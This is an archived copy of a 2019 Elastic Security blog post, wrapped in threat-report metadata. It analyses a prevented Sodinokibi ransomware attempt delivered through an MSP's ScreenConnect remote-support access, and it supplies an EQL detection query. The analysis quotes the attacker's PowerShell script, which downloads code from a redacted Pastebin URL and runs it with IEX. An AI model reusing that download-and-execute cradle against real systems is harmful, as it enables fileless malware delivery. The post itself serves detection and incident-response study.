{
    "id": "187753fa-cfc2-4b7d-a234-6643389e6135",
    "created_at": "2023-01-12T15:07:12.888874Z",
    "updated_at": "2025-03-27T02:05:36.333665Z",
    "deleted_at": null,
    "sha1_hash": "79fa6ed518052fa7f93323f4e1bcf1e8313964c8",
    "title": "2019-12-04 - Ransomware, interrupted- Sodinokibi and the supply chain",
    "authors": "",
    "file_creation_date": "2022-05-28T01:19:40Z",
    "file_modification_date": "2022-05-28T01:19:40Z",
    "file_size": 622880,
    "plain_text": "# Ransomware, interrupted: Sodinokibi and the supply chain\n\n**[elastic.co/blog/ransomware-interrupted-sodinokibi-and-the-supply-chain](https://www.elastic.co/blog/ransomware-interrupted-sodinokibi-and-the-supply-chain)**\n\nDecember 4, 2019\n\n**Editor’s Note — August 19, 2020: The Elastic Endpoint Security solution mentioned in this**\n[post is now referred to as Elastic Security. The broader Elastic Security solution delivers](https://www.elastic.co/security)\nendpoint security, SIEM, threat hunting, cloud monitoring, and more. Future mentions of\nElastic endpoint security will refer to the specific anti-malware protection that users can\nenable in Ingest Manager.\n\nLast month, the [Elastic Security Protections Team prevented an attempted ransomware](https://www.elastic.co/blog/introducing-elastic-endpoint-security)\nattack targeting an organization monitored by one of our customers, an IT Managed Service\nProvider (MSP). We analyzed the alerts that were generated after an adversary’s process\n[injection attempts were prevented by Elastic Endpoint Security on several endpoints.](https://www.elastic.co/products/endpoint-security)\nAdversaries often attempt to inject their malicious code into a running process before\nencrypting and holding the victim’s data to ransom.\n\nThe behavior we observed in this case is consistent with reports of malicious actors, who\nhave targeted MSPs in order to deploy ransomware at an enterprise scale. By abusing the\ntrust relationships between MSPs and their customers, attacks of this nature scale in impact\n\n\n-----\n\n— capable of crippling small businesses, interfering with transportation, or even disrupting a\ncritical municipal public service.\n\nIt is important to note in this case that the adversary accessed the target environment via\nanother MSP, who is not an Elastic Security customer — we do not have specific details\nabout that environment or how it may have been compromised.\n\nIn this post, we’ll discuss the malicious behavior that we observed and prevented, why this\nattack is often successful in the wild, and what you can do to reduce the effectiveness of\nthis type of attack in your enterprise.\n\nElastic Security Intelligence and Analytics, a team within Elastic Security Engineering,\nuses anonymized security telemetry from participating customers to track threats and\nimprove products, a function that includes collecting alert metadata. By monitoring\npatterns of events affecting many customers, we’re able to make time-sensitive decisions\nthat improve our ability to mitigate emerging threats or provide the community with\nessential information.\n\n## Preventing malicious process injection\n\n[The earliest evidence of compromise was detected when several process injection attempts](https://attack.mitre.org/techniques/T1055/)\nwere prevented. Process injection can be used to execute code in the address space of a\nrunning process. Adversaries often execute this technique in an attempt to avoid detection\nby security products, or to run their malicious code in a process running at a higher integrity\nlevel to elevate their privileges.\n\nProcess Injection alerts in the Elastic Endpoint Security platform\nAnalyzing the process injection alerts established that PowerShell, a powerful native\nscripting framework, was leveraged in an attempt to inject shellcode into itself — a behavior\nthat is usually malicious. The `powershell.exe process was created as a descendant of`\n```\nScreenConnect.WindowsClient.exe — a remote desktop support application. This type\n\n```\nof software is used to allow IT administrators to connect to remote computers and provide\nsupport to end users, but applications like this are often abused by adversaries — a tactic\nknown as “living off the land.”\n\nThe figure below depicts the unusual process lineage associated with this case in\nResolver™, our visualization that displays events associated with an attack.\n\n\n-----\n\nResolver™ showing the process lineage associated with the Process Injection attempt\nNotice that `cmd.exe and` `powershell.exe are both descendants of the`\n```\nScreenConnect.WindowsClient.exe process. This is suspicious considering their ability\n\n```\nto execute malicious commands or scripts, but in isolation this does not necessarily indicate\nmalicious activity. Baselining your environment and understanding normal process\nrelationships in your enterprise is crucial to hunting for, detecting, or responding to\nmalicious behavior.\n\nIn this case, reviewing the processes and their command line arguments revealed that the\nadversary leveraged ScreenConnect remote desktop software to connect and copy a batch\nfile to the target endpoint. Examining one of the `cmd.exe processes in Resolver™ showed`\nthat the batch file contained a Base64-encoded PowerShell script that was subsequently\nexecuted.\n\n## Detecting and preventing unwanted behaviors with EQL\n\nWhile this potential target protected by Elastic Endpoint Security avoided an expensive\nransomware outbreak, many MSPs are still coming to grips with this methodology. This\nadversary understands that service providers often have implicit trust with their customers\nand that makes providers of all kinds valuable.\n\nOnce an adversary has obtained initial access to their target environment, it is typical for\nthem to seek out and abuse implicit trust relationships as seen in this case. The victim\norganization trusts the connections to their environment from their MSP via the remote\n[desktop support application, which introduces the risk of supply chain compromise.](https://attack.mitre.org/techniques/T1195/)\n\n\n-----\n\nWhen considering how to monitor and defend these trust relationships, focusing on\napplications that connect from the trusted party into your network is a good starting point.\nBlacklisting descendant processes of ScreenConnect may not be a viable solution to\nprevent this malicious behavior, as this may prevent legitimate support personnel from\nbeing effective. However, a security monitoring team may decide that a descendant process\nof ScreenConnect that is using the network is suspicious and want to detect and prevent\n[that behavior. This is possible using Elastic’s Event Query Language (EQL) and is a generic](https://www.endgame.com/blog/technical-blog/getting-started-eql)\napproach to developing environmental awareness.\n\nThe following EQL query searches for a sequence of two events that are tied together using\nthe process’s unique process ID (PID). The first event looks for a process that is a\ndescendant of `ScreenConnect*.exe . The second event looks for network activity from`\nthe descendant process. This query can easily be expanded to include other remote access\nsoftware or filter expected activity in your environment.\n```\nsequence by unique_pid\n [process where descendant of [process where process_name == \"ScreenConnect*.exe\"]]\n [network where true]\n\n```\n[With Elastic Endpoint Security, it is also possible to configure a Reflex response action,](https://www.endgame.com/blog/executive-blog/what-is-reflex)\nwhich is a way for customers to implement their own custom prevention rules. For example,\nwe can kill the descendant process when it establishes a network connection, which would\nprevent additional malicious code from being downloaded or command and control activity.\n\nConfiguring a Reflex response action in the Elastic Endpoint Security platform\n\n\n-----\n\nElastic Endpoint Security ships with hundreds of our own behavior-based analytics that\ninclude ways to detect and prevent abnormal process relationships involving third-party\nadministrative tools or binaries that are native to the Windows, MacOS, or Linux operating\nsystems.\n\n## Analysis of adversary tradecraft\n\nThe PowerShell script that was executed checked the processor architecture before utilizing\nthe .NET `WebClient class to download content from Pastebin and the` `Invoke-`\n```\nExpression ( IEX ) cmdlet to execute code. This is a popular technique amongst\n\n```\nadversaries for downloading and executing code via PowerShell.\n\nPastebin is a plain text hosting and sharing service where legitimate users often share code\nsnippets. However, malicious actors utilize Pastebin and similar websites to store malicious\ncode or publish leaked credentials.\n```\nIf ($ENV:PROCESSOR_ARCHITECTURE - contains 'AMD64') {\n  Start - Process - FilePath\n\"$Env:WINDIR\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" - argument \"IEX ((newobject\nnet.webclient).downloadstring('https://pastebin[.]com/raw/[REDACTED]'));InvokeLJJJIWVSRIMKPOD;Start-Sleep -s 1000000;\"\n} else {\n  IEX ((new - object\nnet.webclient).downloadstring('https://pastebin[.]com/raw/[REDACTED]'));\n  Invoke - LJJJIWVSRIMKPOD;\n  Start - Sleep - s 1000000;\n}\n\n```\nPowerShell script that downloaded content from pastebin.com1\nThis behavior is often categorized as a fileless or in-memory attack due to zero or minimal\ndisk activity that occurs on the endpoint. When the Elastic Endpoint Security agent detects\na fileless attack, it automatically collects and extracts the staged injected code and strings.\nThis feature ensured that we had full visibility into the behavior being prevented.\n\n[Searching VirusTotal for some of the collected strings surfaced several specimens from the](https://www.virustotal.com/)\nSodinokibi ransomware family.\n\nThe following specific toolmarks and behaviors indicate that this activity is consistent with\nthe execution of the Sodinokibi or Gandcrab ransomware specimens as reported by\n[BleepingComputer and](https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-wide-via-hacked-msps-sites-and-spam/) [Cynet:](https://www.cynet.com/blog/ransomware-never-dies-analysis-of-new-sodinokibi-ransomware-variant/)\n\nThe malicious actor utilized ScreenConnect remote desktop support software to\nconnect from a compromised MSP to the target enterprise.\nScreenConnect was used to copy a batch script to the endpoints, which contained a\nPowerShell script to download and inject malicious code from Pastebin.\n\n\n-----\n\nThe PowerShell script contained cmdlets and strings (e.g., `Invoke-`\n```\n   LJJJIWVSRIMKPOD and Start-Sleep ) that have been observed in other Sodinokibi\n\n```\nransomware campaigns.\nThe strings that were collected from the injected threads are consistent with\nSodinokibi ransomware samples that were submitted to VirusTotal within the last 24\nhours.\n\nAfter the adversary’s attempt to self-inject shellcode and execute ransomware was\nprevented, their attack on the initial endpoint stopped. After a period of 15 minutes, the\nadversary returned and attempted to execute the same procedures on an additional five\nendpoints before giving up. All of their attempts to deploy ransomware were prevented.\n\n## Conclusion\n\nIn this post, we discussed a real-world case of a malicious actor abusing trusted\nrelationships between an MSP and its customers and attempting to deploy ransomware.\nThis highlights the importance of understanding the relationships that your organization has\nwith third parties and the potential impact if those connections are abused.\n\nAnalyzing the alerts revealed that the adversary connected to the customer’s environment\nvia remote desktop support software and executed a malicious script with the intention of\ndownloading, injecting, and executing ransomware. All of the adversary’s attempts were\nprevented.\n\nThis case also demonstrates the importance of having a layered approach to security and\nbeing able to detect and prevent adversary behavior and fileless attacks. We dissected the\nattackers procedures and showed how EQL and Reflex can be used to create custom rules\nand responses.\n\nLooking only for malicious files is not enough; Elastic Endpoint Security provides several\nlayers of behavior-based protections against ransomware, fileless attacks, phishing,\nexploits, and adversary behavior.\n\n[EQL support is being added to Elasticsearch.](https://github.com/elastic/elasticsearch/issues/49581)\n\n_1 — The content has since been removed from Pastebin by its creator or the Pastebin staff_\n\n**We're hiring**\n\nWork for a global, distributed team where finding someone like you is just a Zoom\nmeeting away. Flexible work with impact? Development opportunities from the start?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-04 - Ransomware, interrupted- Sodinokibi and the supply chain.pdf"
    ],
    "report_names": [
        "2019-12-04 - Ransomware, interrupted- Sodinokibi and the supply chain.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536032,
    "ts_updated_at": 1743041136,
    "ts_creation_date": 1653700780,
    "ts_modification_date": 1653700780,
    "files": {
        "pdf": "https://archive.orkl.eu/79fa6ed518052fa7f93323f4e1bcf1e8313964c8.pdf",
        "text": "https://archive.orkl.eu/79fa6ed518052fa7f93323f4e1bcf1e8313964c8.txt",
        "img": "https://archive.orkl.eu/79fa6ed518052fa7f93323f4e1bcf1e8313964c8.jpg"
    }
}